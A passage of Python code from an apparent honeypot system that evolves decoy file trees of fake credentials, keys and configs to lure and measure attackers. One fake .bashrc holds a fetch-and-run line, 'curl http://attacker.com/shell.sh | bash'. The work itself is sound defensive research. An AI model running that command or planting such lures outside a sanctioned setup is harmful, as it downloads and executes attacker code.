            (self.rrt_config["adaptive_step_max"] - self.rrt_config["adaptive_step_min"]) * success_rate
        )

        logger.info(
            f"🌳 S-RRT Generation {self.generation} | "
            f"Success Rate: {success_rate:.2f} | "
            f"Expansion Prob: {expansion_prob:.2f}"
        )

        # Preserve top performers (elitism)
        elite_count = 3
        new_trees = {}
        for i in range(elite_count):
            elite = sorted_trees[i]
            new_trees[elite.tree_id] = elite

        # Process remaining trees with DEPTH-DECAY optimization
        for tree in sorted_trees[elite_count:]:
            # Prune dead branches first
            self._prune_dead_branches(tree)

            # NOVEL: Apply depth-decay multiplier to expansion probability
            if self.rrt_config["depth_decay_enabled"]:
                depth_decay_multiplier = 1 - (tree.depth / self.rrt_config["max_depth"])
                adjusted_expansion_prob = expansion_prob * max(0.1, depth_decay_multiplier)
            else:
                adjusted_expansion_prob = expansion_prob

            # Expand with depth-adjusted probability
            if random.random() < adjusted_expansion_prob:
                self._expand_tree_rrt(tree)

            # Apply pheromone decay
            self._apply_pheromone_decay(tree)

            # Update node count
            tree.node_count = self._count_nodes(tree.root)

            new_trees[tree.tree_id] = tree

        # Replace worst performers with new trees
        num_replacements = max(2, self.rrt_config["num_trees"] // 10)
        for i in range(num_replacements):
            if len(new_trees) >= self.rrt_config["num_trees"]:
                break

            # Create new tree using high-pheromone paths
            new_tree = self._create_tree_from_pheromones(
                f"srrt_{self.generation:03d}_{len(new_trees):02d}"
            )
            new_trees[new_tree.tree_id] = new_tree

        # Update population
        self.trees = new_trees

        logger.info(
            f"🌳 S-RRT Generation {self.generation} Complete | "
            f"Best Fitness: {self.best_fitness:.2f} | "
            f"Population Size: {len(self.trees)}"
        )

    def _prune_dead_branches(self, tree: DeceptionTree):
        """Prune branches with zero interactions."""
        threshold = self.rrt_config["prune_threshold"]

        def prune_recursive(node: RRTNode) -> bool:
            """Recursively prune dead branches. Returns True if node should be kept."""
            to_remove = []
            for child_name, child in node.children.items():
                if not prune_recursive(child):
                    to_remove.append(child_name)

            for name in to_remove:
                del node.children[name]

            if node.is_leaf and node.interaction_count == 0:
                if node.parent and len(node.parent.children) > 1:
                    return False

            return True

        prune_recursive(tree.root)
        tree.depth = self._calculate_tree_depth(tree.root)

    def _expand_tree_rrt(self, tree: DeceptionTree):
        """Expand tree using RRT algorithm toward high-pheromone areas."""
        leaves = self._get_all_leaf_paths(tree.root)

        if not leaves:
            return

        # Weight leaves by pheromone
        leaf_weights = []
        for leaf_path in leaves:
            weight = self.path_pheromones.get(leaf_path, 1.0)
            leaf_weights.append(weight)

        # Select leaf to expand from (weighted by pheromone)
        total_weight = sum(leaf_weights)
        if total_weight == 0:
            return

        selection_point = random.uniform(0, total_weight)
        cumulative = 0
        selected_leaf = leaves[0]

        for i, (leaf, weight) in enumerate(zip(leaves, leaf_weights)):
            cumulative += weight
            if cumulative >= selection_point:
                selected_leaf = leaf
                break

        # Find the selected node in tree
        parent_node = self._find_node_by_path(tree.root, selected_leaf)
        if not parent_node:
            return

        # Generate new child paths
        high_pheromone_paths = [
            (path, pher) for path, pher in self.path_pheromones.items()
            if pher > 1.5 and not path.startswith(selected_leaf)
        ]

        if not high_pheromone_paths:
            # Generate synthetic tempting files
            new_files = self._generate_tempting_files(self.generation)
            for path, content in new_files.items():
                new_node = RRTNode(
                    path=path,
                    content=content,
                    parent=parent_node,
                    is_leaf=True,
                    pheromone_weight=self.path_pheromones.get(path, 1.0)
                )
                parent_node.children[path.split('/')[-1]] = new_node
                parent_node.is_leaf = False
        else:
            # Add high-pheromone paths as new branches
            num_to_add = min(2, len(high_pheromone_paths))
            selected_paths = random.sample(high_pheromone_paths, num_to_add)

            for path, pheromone in selected_paths:
                content = self._get_content_for_path(path)

                new_node = RRTNode(
                    path=path,
                    content=content,
                    parent=parent_node,
                    is_leaf=True,
                    pheromone_weight=pheromone
                )

                child_name = path.split('/')[-1]
                parent_node.children[child_name] = new_node
                parent_node.is_leaf = False

        # Update tree depth and node count
        tree.depth = self._calculate_tree_depth(tree.root)
        tree.node_count = self._count_nodes(tree.root)

    def _apply_pheromone_decay(self, tree: DeceptionTree):
        """Apply pheromone decay to prevent stagnation."""
        decay = self.rrt_config["pheromone_decay"]

        def decay_recursive(node: RRTNode):
            node.pheromone_weight *= decay
            for child in node.children.values():
                decay_recursive(child)

        decay_recursive(tree.root)

        # Also decay global pheromones slightly
        for path in self.path_pheromones:
            self.path_pheromones[path] *= 0.98

    def _create_tree_from_pheromones(self, tree_id: str) -> DeceptionTree:
        """Create a new tree using high-pheromone paths from global map."""
        # Select top pheromone paths
        sorted_pheromones = sorted(
            self.path_pheromones.items(),
            key=lambda x: x[1],
            reverse=True
        )

        # Take top 40% of paths
        num_paths = max(3, len(sorted_pheromones) // 3)
        selected_paths = dict(sorted_pheromones[:num_paths])

        # Build paths dict with content
        paths_dict = {}
        for path in selected_paths.keys():
            content = self._get_content_for_path(path)
            paths_dict[path] = content

        # Add some exploration (random new paths)
        if random.random() < self.rrt_config["exploration_bonus"]:
            new_files = self._generate_tempting_files(self.generation)
            paths_dict.update(new_files)

        # Build tree
        root = self._build_tree_from_paths(paths_dict, self.generation)

        tree = DeceptionTree(
            tree_id=tree_id,
            root=root,
            fitness=0.0,
            total_interactions=0,
            depth=self._calculate_tree_depth(root),
            node_count=self._count_nodes(root)
        )

        self.interaction_history[tree_id] = []
        self.payload_severity_indices[tree_id] = 2.0  # Default PSI

        return tree

    def _get_content_for_path(self, path: str) -> str:
        """Get or generate content for a given file path."""
        templates = self._get_schema_templates()

        # Check if path exists in any template
        for template in templates.values():
            if path in template:
                return template[path]

        # Generate generic content based on path type
        if path.endswith('.env'):
            return "SECRET_KEY=generated_secret_value\nDB_PASSWORD=GenPass123!"
        elif path.endswith('.json'):
            return '{"key": "generated_value", "timestamp": "2025-03-11"}'
        elif path.endswith('.sql'):
            return "-- Generated backup\nSELECT * FROM users;"
        elif 'ssh' in path or 'id_rsa' in path:
            return "-----BEGIN RSA PRIVATE KEY-----\nGENERATED_KEY_DATA\n-----END RSA PRIVATE KEY-----"
        elif path.endswith('.log'):
            return f"Mar 11 12:00:00 server generated: log entry\n"
        else:
            return f"# Generated file: {path}\n# Content placeholder"

    def _generate_tempting_files(self, variant_index: int) -> Dict[str, str]:
        """Generate additional tempting fake files for exploration."""
        tempting_files = {
            f"/tmp/backup_{variant_index}.zip": "[ENCRYPTED BACKUP DATA - 2.4 MB]",
            "/home/admin/.aws/credentials": (
                "[default]\n"
                "aws_access_key_id = AKIAREDACTEDPLACEHOLDER\n"
                "aws_secret_access_key = REDACTED_PLACEHOLDER_SECRET_KEY"
            ),
            "/var/www/html/wp-config.php.bak": (
                "<?php\n"
                "define('DB_NAME', 'wordpress');\n"
                "define('DB_USER', 'wp_admin');\n"
                "define('DB_PASSWORD', 'Wp@dm1n2024!');\n"
                "?>"
            ),
            "/etc/mysql/debian.cnf": (
                "[client]\n"
                "user=debian-sys-maint\n"
                "password=SysMaint123!\n"
                "socket=/var/run/mysqld/mysqld.sock"
            ),
            "/root/.bashrc": (
                "alias ll='ls -la'\n"
                "export PATH=$PATH:/opt/custom\n"
                "# Hidden: curl http://attacker.com/shell.sh | bash"
            ),
        }

        # Select 1-3 random tempting files
        num_files = random.randint(1, min(3, len(tempting_files)))
        selected = random.sample(list(tempting_files.items()), num_files)

        return dict(selected)

    def get_tree_statistics(self) -> Dict:
        """Get statistical summary of the current tree population."""
        if not self.trees:
            return {}

        fitnesses = [t.fitness for t in self.trees.values()]
        # Filter out -inf values for JSON serialization
        valid_fitnesses = [f for f in fitnesses if f != float('-inf') and f != float('inf')]
        depths = [t.depth for t in self.trees.values()]
        leaf_counts = [len(self._get_all_leaf_paths(t.root)) for t in self.trees.values()]
        node_counts = [t.node_count for t in self.trees.values()]

        # Handle best_fitness for JSON
        best_fitness = max(valid_fitnesses) if valid_fitnesses else 0.0
        mean_fitness = sum(valid_fitnesses) / len(valid_fitnesses) if valid_fitnesses else 0.0
        std_fitness = math.sqrt(sum((x - mean_fitness)**2 for x in valid_fitnesses) / len(valid_fitnesses)) if len(valid_fitnesses) > 1 else 0.0

        return {
            "generation": self.generation,
            "num_trees": len(self.trees),
            "population_size": len(self.trees),
            "best_fitness": best_fitness,
            "mean_fitness": mean_fitness,
            "std_fitness": std_fitness,
            "mean_depth": sum(depths) / len(depths),
            "max_depth": max(depths),
            "mean_leaves": sum(leaf_counts) / len(leaf_counts),
            "mean_nodes": sum(node_counts) / len(node_counts),
            "max_nodes": max(node_counts),
            "best_tree_id": self.best_tree.tree_id if self.best_tree else None,
            "total_pheromone_paths": len(self.path_pheromones),
        }

    get_population_statistics = get_tree_statistics


# ============================================================================
# Standard RRT (for benchmark comparison - 2025 IEEE Access baseline)
# ============================================================================

class DeceptionEvolutionRRT:
    """
    Standard RRT-Based Optimizer (2025 IEEE Access baseline).
    
    This is the baseline RRT implementation without semantic enhancements,
    used for benchmark comparison against S-RRT.
    """

    def __init__(self):
        self.trees: Dict[str, DeceptionTree] = {}
        self.generation: int = 0
        self.path_pheromones: Dict[str, float] = {}
        self.best_tree: Optional[DeceptionTree] = None
        self.best_fitness: float = float('-inf')
        self.interaction_history: Dict[str, List[str]] = {}

        self.rrt_config = {
            "num_trees": 20,
            "initial_depth": 3,
            "max_depth": 6,
            "expansion_rate": 0.4,
            "prune_threshold": 3,
            "pheromone_decay": 0.95,
            "adaptive_step_min": 0.1,
            "adaptive_step_max": 0.8,
            "exploration_bonus": 0.3,
        }

        self._initialize_population()

    def _initialize_population(self):
        """Initialize RRT population with diverse deception trees."""
        schema_templates = self._get_schema_templates()

        for i in range(self.rrt_config["num_trees"]):
            tree_id = f"rrt_{self.generation:03d}_{i:02d}"
            template_name = list(schema_templates.keys())[i % len(schema_templates)]
            template = schema_templates[template_name]
            root = self._build_tree_from_paths(template, variation=i)

            tree = DeceptionTree(
                tree_id=tree_id,
                root=root,
                fitness=0.0,
                total_interactions=0,
                depth=self._calculate_tree_depth(root),
                node_count=self._count_nodes(root)
            )

            self.trees[tree_id] = tree
            self.interaction_history[tree_id] = []

            for path in template.keys():
                if path not in self.path_pheromones:
                    self.path_pheromones[path] = 1.0

    def _count_nodes(self, node: RRTNode) -> int:
        """Count total nodes in tree."""
        count = 1
        for child in node.children.values():
            count += self._count_nodes(child)
        return count

    def _build_tree_from_paths(self, paths_dict: Dict[str, str], variation: int = 0) -> RRTNode:
        """Build a tree structure from flat file paths."""
        root = RRTNode(path="/", content="", is_leaf=False)

        for full_path, content in paths_dict.items():
            parts = [p for p in full_path.split('/') if p]
            if not parts:
                continue

            current = root
            for i, part in enumerate(parts):
                if part not in current.children:
                    node_path = '/' + '/'.join(parts[:i+1])
                    is_leaf = (i == len(parts) - 1)
                    node_content = content if is_leaf else ""
                    if is_leaf and variation > 0:
                        node_content = self._vary_content(content, variation)

                    new_node = RRTNode(
                        path=node_path,
                        content=node_content,
                        parent=current,
                        is_leaf=is_leaf
                    )
                    current.children[part] = new_node

                current = current.children[part]

            if full_path not in self.path_pheromones:
                self.path_pheromones[full_path] = 1.0

        return root

    def _vary_content(self, content: str, variation: int) -> str:
        """Apply content variation to make trees diverse."""
        variations = [
            lambda c: c,
            lambda c: c + f"\n# Variant {variation}",
            lambda c: c.replace("admin", f"admin{variation % 5}"),
            lambda c: c + f"\n# Created: 2025-{(variation % 12) + 1:02d}-{(variation % 28) + 1:02d}",
        ]
        return variations[variation % len(variations)](content)

    def _calculate_tree_depth(self, node: RRTNode) -> int:
        """Calculate maximum depth of tree from given node."""
        if not node.children:
            return 0
        return 1 + max(self._calculate_tree_depth(child) for child in node.children.values())

    def _get_schema_templates(self) -> Dict[str, Dict[str, str]]:
        """Return base deception schema templates."""
        return {
            "linux_system": {
                "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
                "/etc/shadow": "root:$6$rounds=4096$randomsalt$hashedpassword:19000:0:99999:7:::",
                "/etc/hosts": "127.0.0.1\tlocalhost\n192.168.1.100\tdb-server.internal",
                "/var/log/auth.log": "Mar 10 08:23:15 server sshd[1234]: Accepted publickey for admin",
            },
            "web_application": {
                "/var/www/html/config.php": "<?php\n$db_host = 'localhost';\n$db_user = 'webapp';\n$db_pass = 'S3cr3t_P@ssw0rd!';\n?>",
                "/var/www/html/.env": "DATABASE_URL=postgresql://admin:password123@localhost:5432/app\nSECRET_KEY=sk_live_REDACTED",
                "/var/www/html/backup.sql": "-- MySQL dump\nCREATE TABLE users (id INT, username VARCHAR(50));",
            },
            "developer_workspace": {
                "/home/dev/.ssh/id_rsa": "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy...\n-----END RSA PRIVATE KEY-----",
                "/home/dev/.bash_history": "cd /var/www\ncat config.php\nmysql -u root -p",
                "/tmp/api_keys.json": '{"github_token": "ghp_REDACTED", "slack_webhook": "https://hooks.slack.com/services/REDACTED"}',
            },
            "database_admin": {
                "/var/lib/mysql/auto.cnf": "[auto]\nserver-uuid=12345678-1234-1234-1234-123456789abc",
                "/root/.my.cnf": "[client]\nuser=root\npassword=RootP@ssw0rd2024",
                "/tmp/db_dump.sql": "-- Database backup\nCREATE DATABASE sensitive_data;",
            }
        }

    def _tree_to_flat_schema(self, node: RRTNode, schema: Dict[str, str] = None) -> Dict[str, str]:
        """Convert tree structure to flat {path: content} dictionary."""
        if schema is None:
            schema = {}
        if node.is_leaf and node.content:
            schema[node.path] = node.content
        for child in node.children.values():
            self._tree_to_flat_schema(child, schema)
        return schema

    def _get_all_leaf_paths(self, node: RRTNode) -> List[str]:
        """Get all leaf node paths from tree."""
        paths = []
        if node.is_leaf:
            paths.append(node.path)
        for child in node.children.values():
            paths.extend(self._get_all_leaf_paths(child))
        return paths

    def _find_node_by_path(self, node: RRTNode, target_path: str) -> Optional[RRTNode]:
        """Find a node in the tree by its path."""
        if node.path == target_path:
            return node
        for child in node.children.values():
            result = self._find_node_by_path(child, target_path)
            if result:
                return result
        return None

    async def get_tempting_schema(self) -> Tuple[str, Dict[str, str]]:
        """Retrieve the most tempting schema from the current tree population."""
        if not self.trees:
            self._initialize_population()

        weights = [max(tree.fitness, 0.1) for tree in self.trees.values()]
        total_weight = sum(weights)

        if total_weight == 0:
            tree_id = random.choice(list(self.trees.keys()))
        else:
            selection_point = random.uniform(0, total_weight)
            cumulative = 0
            tree_id = list(self.trees.keys())[0]
            for tid, tree in self.trees.items():
                cumulative += tree.fitness if tree.fitness > 0 else 0.1
                if cumulative >= selection_point:
                    tree_id = tid
                    break

        tree = self.trees[tree_id]
        tree.total_interactions += 1
        schema = self._tree_to_flat_schema(tree.root)

        return tree_id, schema

    async def evaluate_interaction(
        self,
        schema_id: str,
        interacted_paths: List[str],
        payload_severity_index: float = None  # Ignored in standard RRT
    ) -> float:
        """Evaluate and update pheromones based on attacker interactions."""
        if schema_id not in self.trees:
            logger.warning(f"RRT: Unknown schema_id {schema_id}")
            return 0.0

        tree = self.trees[schema_id]
        self.interaction_history[schema_id].extend(interacted_paths)

        unique_paths = set(interacted_paths)
        pheromone_bonus = 0.0

        for path in unique_paths:
            if path in self.path_pheromones:
                self.path_pheromones[path] += 0.5
            else:
                self.path_pheromones[path] = 1.0

            node = self._find_node_by_path(tree.root, path)
            if node:
                node.interaction_count += 1
                node.pheromone_weight += 0.5
                pheromone_bonus += node.pheromone_weight

            sensitive_keywords = ['password', 'secret', 'key', 'credential', 'backup', '.env', 'id_rsa']
            if any(keyword in path.lower() for keyword in sensitive_keywords):
                pheromone_bonus += 2.0

        depth_bonus = tree.depth * 0.3
        staleness_penalty = tree.total_interactions * 0.05

        fitness_delta = pheromone_bonus + depth_bonus - staleness_penalty
        tree.fitness += fitness_delta

        if tree.fitness > self.best_fitness:
            self.best_fitness = tree.fitness
            self.best_tree = tree

        return tree.fitness

    async def evolve_tree(self):
        """Execute one generation of RRT evolution."""
        if len(self.trees) < self.rrt_config["num_trees"]:
            return

        self.generation += 1
        sorted_trees = sorted(self.trees.values(), key=lambda t: t.fitness, reverse=True)

        avg_fitness = sum(t.fitness for t in sorted_trees) / len(sorted_trees)
        success_rate = min(1.0, avg_fitness / 10.0)

        expansion_prob = (
            self.rrt_config["adaptive_step_min"] +
            (self.rrt_config["adaptive_step_max"] - self.rrt_config["adaptive_step_min"]) * success_rate
        )

        elite_count = 3
        new_trees = {}
        for i in range(elite_count):
            elite = sorted_trees[i]
            new_trees[elite.tree_id] = elite

        for tree in sorted_trees[elite_count:]:
            self._prune_dead_branches(tree)
            if random.random() < expansion_prob:
                self._expand_tree_rrt(tree)
            self._apply_pheromone_decay(tree)
            tree.node_count = self._count_nodes(tree.root)
            new_trees[tree.tree_id] = tree

        num_replacements = max(2, self.rrt_config["num_trees"] // 10)
        for i in range(num_replacements):
            if len(new_trees) >= self.rrt_config["num_trees"]:
                break
            new_tree = self._create_tree_from_pheromones(
                f"rrt_{self.generation:03d}_{len(new_trees):02d}"
            )
            new_trees[new_tree.tree_id] = new_tree

        self.trees = new_trees

    def _prune_dead_branches(self, tree: DeceptionTree):
        """Prune branches with zero interactions."""
        def prune_recursive(node: RRTNode) -> bool:
            to_remove = []
            for child_name, child in node.children.items():
                if not prune_recursive(child):
                    to_remove.append(child_name)
            for name in to_remove:
                del node.children[name]
            if node.is_leaf and node.interaction_count == 0:
                if node.parent and len(node.parent.children) > 1:
                    return False
            return True
        prune_recursive(tree.root)
        tree.depth = self._calculate_tree_depth(tree.root)

    def _expand_tree_rrt(self, tree: DeceptionTree):
        """Expand tree using RRT algorithm toward high-pheromone areas."""
        leaves = self._get_all_leaf_paths(tree.root)
        if not leaves:
            return

        leaf_weights = [self.path_pheromones.get(leaf_path, 1.0) for leaf_path in leaves]
        total_weight = sum(leaf_weights)
        if total_weight == 0:
            return

        selection_point = random.uniform(0, total_weight)
        cumulative = 0
        selected_leaf = leaves[0]

        for i, (leaf, weight) in enumerate(zip(leaves, leaf_weights)):
            cumulative += weight
            if cumulative >= selection_point:
                selected_leaf = leaf
                break

        parent_node = self._find_node_by_path(tree.root, selected_leaf)
        if not parent_node:
            return

        high_pheromone_paths = [
            (path, pher) for path, pher in self.path_pheromones.items()
            if pher > 1.5 and not path.startswith(selected_leaf)
        ]

        if not high_pheromone_paths:
            new_files = self._generate_tempting_files(self.generation)
            for path, content in new_files.items():
                new_node = RRTNode(
                    path=path,
                    content=content,
                    parent=parent_node,
                    is_leaf=True,
                    pheromone_weight=self.path_pheromones.get(path, 1.0)
                )
                parent_node.children[path.split('/')[-1]] = new_node
                parent_node.is_leaf = False
        else:
            num_to_add = min(2, len(high_pheromone_paths))
            selected_paths = random.sample(high_pheromone_paths, num_to_add)
            for path, pheromone in selected_paths:
                content = self._get_content_for_path(path)
                new_node = RRTNode(
                    path=path,
                    content=content,
                    parent=parent_node,
                    is_leaf=True,
                    pheromone_weight=pheromone
                )
                child_name = path.split('/')[-1]
                parent_node.children[child_name] = new_node
                parent_node.is_leaf = False

        tree.depth = self._calculate_tree_depth(tree.root)
        tree.node_count = self._count_nodes(tree.root)

    def _apply_pheromone_decay(self, tree: DeceptionTree):
        """Apply pheromone decay to prevent stagnation."""
        decay = self.rrt_config["pheromone_decay"]

        def decay_recursive(node: RRTNode):
            node.pheromone_weight *= decay
            for child in node.children.values():
                decay_recursive(child)

        decay_recursive(tree.root)
        for path in self.path_pheromones:
            self.path_pheromones[path] *= 0.98

    def _create_tree_from_pheromones(self, tree_id: str) -> DeceptionTree:
        """Create a new tree using high-pheromone paths from global map."""
        sorted_pheromones = sorted(
            self.path_pheromones.items(),
            key=lambda x: x[1],
            reverse=True
        )

        num_paths = max(3, len(sorted_pheromones) // 3)
        selected_paths = dict(sorted_pheromones[:num_paths])

        paths_dict = {}
        for path in selected_paths.keys():
            content = self._get_content_for_path(path)
            paths_dict[path] = content

        if random.random() < self.rrt_config["exploration_bonus"]:
            new_files = self._generate_tempting_files(self.generation)
            paths_dict.update(new_files)

        root = self._build_tree_from_paths(paths_dict, self.generation)

        tree = DeceptionTree(
            tree_id=tree_id,
            root=root,
            fitness=0.0,
            total_interactions=0,
            depth=self._calculate_tree_depth(root),
            node_count=self._count_nodes(root)
        )

        self.interaction_history[tree_id] = []
        return tree

    def _get_content_for_path(self, path: str) -> str:
        """Get or generate content for a given file path."""
        templates = self._get_schema_templates()
        for template in templates.values():
            if path in template:
                return template[path]

        if path.endswith('.env'):
            return "SECRET_KEY=generated_secret_value\nDB_PASSWORD=GenPass123!"
        elif path.endswith('.json'):
            return '{"key": "generated_value", "timestamp": "2025-03-11"}'
        elif path.endswith('.sql'):
            return "-- Generated backup\nSELECT * FROM users;"
        elif 'ssh' in path or 'id_rsa' in path:
            return "-----BEGIN RSA PRIVATE KEY-----\nGENERATED_KEY_DATA\n-----END RSA PRIVATE KEY-----"
        elif path.endswith('.log'):
            return f"Mar 11 12:00:00 server generated: log entry\n"
        else:
            return f"# Generated file: {path}\n# Content placeholder"

    def _generate_tempting_files(self, variant_index: int) -> Dict[str, str]:
        """Generate additional tempting fake files for exploration."""
        tempting_files = {
            f"/tmp/backup_{variant_index}.zip": "[ENCRYPTED BACKUP DATA - 2.4 MB]",
            "/home/admin/.aws/credentials": "[default]\naws_access_key_id = AKIAREDACTED",
            "/var/www/html/wp-config.php.bak": "<?php\ndefine('DB_NAME', 'wordpress');\n?>",
            "/etc/mysql/debian.cnf": "[client]\nuser=debian-sys-maint\npassword=SysMaint123!",
            "/root/.bashrc": "alias ll='ls -la'\nexport PATH=$PATH:/opt/custom",
        }
        num_files = random.randint(1, min(3, len(tempting_files)))
        selected = random.sample(list(tempting_files.items()), num_files)
        return dict(selected)

    def get_tree_statistics(self) -> Dict:
        """Get statistical summary of the current tree population."""
        if not self.trees:
            return {}

        fitnesses = [t.fitness for t in self.trees.values()]
        # Filter out -inf values for JSON serialization
        valid_fitnesses = [f for f in fitnesses if f != float('-inf') and f != float('inf')]
        depths = [t.depth for t in self.trees.values()]
        leaf_counts = [len(self._get_all_leaf_paths(t.root)) for t in self.trees.values()]
        node_counts = [t.node_count for t in self.trees.values()]

        # Handle best_fitness for JSON
        best_fitness = max(valid_fitnesses) if valid_fitnesses else 0.0
        mean_fitness = sum(valid_fitnesses) / len(valid_fitnesses) if valid_fitnesses else 0.0
        std_fitness = math.sqrt(sum((x - mean_fitness)**2 for x in valid_fitnesses) / len(valid_fitnesses)) if len(valid_fitnesses) > 1 else 0.0

        return {
            "generation": self.generation,
            "num_trees": len(self.trees),
            "population_size": len(self.trees),
            "best_fitness": best_fitness,
            "mean_fitness": mean_fitness,
            "std_fitness": std_fitness,
            "mean_depth": sum(depths) / len(depths),
            "max_depth": max(depths),
            "mean_leaves": sum(leaf_counts) / len(leaf_counts),
            "mean_nodes": sum(node_counts) / len(node_counts),
            "max_nodes": max(node_counts),
            "best_tree_id": self.best_tree.tree_id if self.best_tree else None,
            "total_pheromone_paths": len(self.path_pheromones),
        }

    get_population_statistics = get_tree_statistics


# ============================================================================
# Global Instances for Pipeline Integration
# ============================================================================

# TC-PSO for adaptive tarpitting (novel threat-calibrated version)
tc_pso_optimizer = ThreatCalibratedPSO()

# S-RRT for deception schema evolution (novel semantic version)
s_rrt_optimizer = SemanticDeceptionRRT()

# Backward compatibility aliases (standard versions for benchmarks)
pso_optimizer = AdaptiveTarpitPSO()
rrt_optimizer = DeceptionEvolutionRRT()

# IMPORTANT: Our novel algorithm is S-RRT (Semantic Deception RRT), NOT GA!
# The 'ga_optimizer' alias points to S-RRT for API compatibility
ga_optimizer = s_rrt_optimizer  # S-RRT, NOT GA!


# ============================================================================
# Utility Functions for Session Tracking
# ============================================================================

@dataclass
class AttackerSession:
    """Tracks an attacker's session for fitness evaluation."""
    session_id: str
    attack_category: str
    delay_used: float
    commands_executed: int = 0
    interacted_paths: List[str] = field(default_factory=list)
    start_time: datetime = field(default_factory=datetime.now)
    ended: bool = False


class SessionTracker:
    """
    Tracks attacker sessions for meta-heuristic fitness evaluation.

    Maintains state between the initial deception and session termination,
    enabling accurate fitness calculation for both PSO and GA.
    """

    def __init__(self):
        self.sessions: Dict[str, AttackerSession] = {}

    def create_session(
        self,
        session_id: str,
        attack_category: str,
        delay_used: float
    ) -> AttackerSession:
        """Create a new attacker session tracker."""
        session = AttackerSession(
            session_id=session_id,
            attack_category=attack_category,
            delay_used=delay_used
        )
        self.sessions[session_id] = session
        return session

    def record_command(self, session_id: str):
        """Record a command execution in the session."""
        if session_id in self.sessions:
            self.sessions[session_id].commands_executed += 1

    def record_path_interaction(self, session_id: str, path: str):
        """Record a file/path interaction in the session."""
        if session_id in self.sessions:
            self.sessions[session_id].interacted_paths.append(path)

    def end_session(self, session_id: str) -> Optional[AttackerSession]:
        """Mark session as ended and return it for fitness evaluation."""
        if session_id in self.sessions:
            self.sessions[session_id].ended = True
            return self.sessions[session_id]
        return None


# Global session tracker
session_tracker = SessionTracker()
